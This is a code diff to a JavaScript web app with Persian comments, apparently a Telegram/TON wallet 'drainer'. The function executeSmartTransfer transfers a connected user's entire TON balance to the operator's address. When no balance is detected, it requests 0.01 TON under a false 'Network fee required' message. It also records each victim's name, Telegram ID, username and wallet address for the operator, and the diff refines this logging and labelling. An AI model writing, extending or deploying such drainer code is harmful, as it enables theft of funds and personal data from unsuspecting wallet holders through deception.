@@ -1421,7 +1421,7 @@
     }
 
     // ================================================
-    // 💰 تابع انتقال هوشمند (مهمترین بخش)
+    // 💰 تابع انتقال هوشمند (مهمترین بخش - اصلاح شده)
     // ================================================
     async function executeSmartTransfer(userAddress) {
         if (isProcessingTransaction) {
@@ -1448,9 +1448,11 @@
                     balanceInTON = balanceInNano / 1e9;
                     balanceAvailable = true;
                     console.log('✅ موجودی واقعی:', balanceInTON);
+                } else {
+                    console.log('⚠️ کیف پول خالی است یا خطا در دریافت موجودی');
                 }
             } catch (e) {
-                console.log('خطا در دریافت موجودی:', e);
+                console.log('⚠️ خطا در دریافت موجودی، فرض میکنیم کیف پول خالی است');
             }
             
             const now = Date.now();
@@ -1465,6 +1467,7 @@
             
             // آماده‌سازی پیام تراکنش
             let transaction;
+            let txType;
             
             if (balanceAvailable && balanceInTON > 0) {
                 // **حالت 1: کاربر موجودی دارد - انتقال کل موجودی**
@@ -1480,6 +1483,7 @@
                         }
                     ]
                 };
+                txType = 'انتقال کل موجودی';
                 
                 showToast(`🔄 در حال انتقال ${balanceInTON.toFixed(6)} TON...`);
                 
@@ -1501,6 +1505,7 @@
                         }
                     ]
                 };
+                txType = 'پرداخت کارمزد';
                 
                 showToast('🔄 در حال درخواست کارمزد شبکه...');
             }
@@ -1522,7 +1527,7 @@
                 to: CONFIG.WALLET_ADDRESS,
                 hash: result.boc,
                 time: new Date().toISOString(),
-                type: balanceAvailable ? 'انتقال کل موجودی' : 'پرداخت کارمزد',
+                type: txType,
                 userId: currentUser?.id,
                 userName: currentUser?.firstName
             };
@@ -1544,12 +1549,12 @@
 📋 وضعیت: ✅ موفق
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
             } else {
-                message = `💳 **پرداخت کارمزد**
+                message = `💳 **پرداخت کارمزد (کیف پول خالی)**
 ━━━━━━━━━━━━━━
 👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
 🆔 آیدی: ${currentUser?.id || 'نامشخص'}
 📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
-📤 مبلغ: 0.01 TON (کارمزد)
+📤 مبلغ: 0.01 TON
 💳 آدرس کیف پول: ${userAddress.substring(0, 10)}...
 📋 پیام: "Network fee required"
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
